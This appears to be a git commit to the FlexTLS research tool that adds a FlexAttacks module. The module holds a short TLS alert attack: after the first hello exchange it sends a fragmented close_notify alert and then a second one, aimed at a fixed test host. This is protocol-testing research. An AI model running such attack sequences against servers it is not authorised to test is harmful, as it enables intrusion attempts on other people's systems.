88ee3c5af5e7a06407a581f66e9fdb24ae28dde8
Benjamin Beurdouche <benjamin.beurdouche@inria.fr>
2014-08-25 15:49:49 +0200

    create an FlexAttacks module

--- FlexTLS/Application.fs
+++ FlexTLS/Application.fs
@@ -13,6 +13,7 @@ open FlexState
 open FlexClientHello
 open FlexServerHello
 open FlexHandshake
+open FlexAttacks
 
 open Bytes
 open TLSError
@@ -26,17 +27,8 @@ let _ =
     (* Establish a Tcp connection to a peer by listening or sending on a socket *)
     let st,cfg = FlexTLS.openConnection (Client,"128.93.189.207","prosecco.fr",4433) in
 
-    (* Ready for handshake using either the top-level API or the Flex|Message| methods *)
-    (* let si,st,sms = FlexTLS.fullHandshake Client st in *)
-    let cfg = { cfg with 
-                maxVer = TLS_1p0;
-                minVer = SSL_3p0;
-    } in
-    let st,nsc,fch = FlexClientHello.send(st,cfg=cfg) in
-    let st,nsc,fsh = FlexServerHello.receive(st,nsc) in
-    let st = FlexAlert.send(st,AD_close_notify,fp=One(1)) in
-    let st = FlexState.updateOutgoingHSBuffer st empty_bytes in
-    let st = FlexAlert.send(st,AD_close_notify) in
+    (* Ready for handshake using either one of the top-level APIs or the Flex|Message| methods *)
+    let st = FlexAttacks.runAlertPlaintextAttack st in 
 
     (* Ready for application data *)
     printf "Ready for application data !\n";
---
+++ FlexTLS/FlexAttacks.fs
@@ -0,0 +1,29 @@
+﻿#light "off"
+
+module FlexAttacks
+
+open Bytes
+open TLSError
+
+open FlexTypes
+open FlexConstants
+open FlexState
+open FlexAlert
+open FlexClientHello
+open FlexServerHello
+
+
+
+
+type FlexAttacks =
+    class
+
+    (* Alert attack inside the first handshake *)
+    static member runAlertPlaintextAttack (st:state) : state =
+        let st,nsc,fch = FlexClientHello.send(st) in
+        let st,nsc,fsh = FlexServerHello.receive(st,nsc) in
+        let st = FlexAlert.send(st,AD_close_notify,fp=One(1)) in
+        let st = FlexState.updateOutgoingAlertBuffer st empty_bytes in
+        FlexAlert.send(st,AD_close_notify)
+
+    end
